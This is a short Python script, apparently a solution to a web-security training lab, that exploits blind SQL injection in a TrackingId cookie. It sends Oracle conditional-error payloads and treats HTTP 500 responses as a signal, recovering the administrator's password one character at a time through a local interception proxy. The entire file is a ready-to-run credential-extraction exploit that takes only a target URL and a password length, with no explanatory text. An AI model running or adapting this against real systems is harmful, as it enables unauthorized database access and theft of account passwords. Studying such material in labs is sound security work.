import requests
import urllib
import urllib3
import sys

import sys
import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def brut_force(url, length):
    password = ""
    r = requests.get(url, verify=False, proxies=proxies)
    cookies = r.cookies['TrackingId']
    for i in range(1, length + 1):
        for j in range(32, 126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            decode_sqli = urllib.parse.quote(sqli_payload)
            new_cookies = cookies + decode_sqli
            new_r = requests.get(url, cookies={"TrackingId": new_cookies, 'session': r.cookies['session']}, verify=False, proxies=proxies)

            if new_r.status_code == 500:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <length>" % sys.argv[0])
        print("(+) Example: %s www.example.com 20" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    try:
        length = int(sys.argv[2])
    except ValueError:
        print("(-) Length must be an integer")
        sys.exit(1)

    print("(+) Retrieving administrator password...")
    brut_force(url, length)

if __name__ == "__main__":
    main()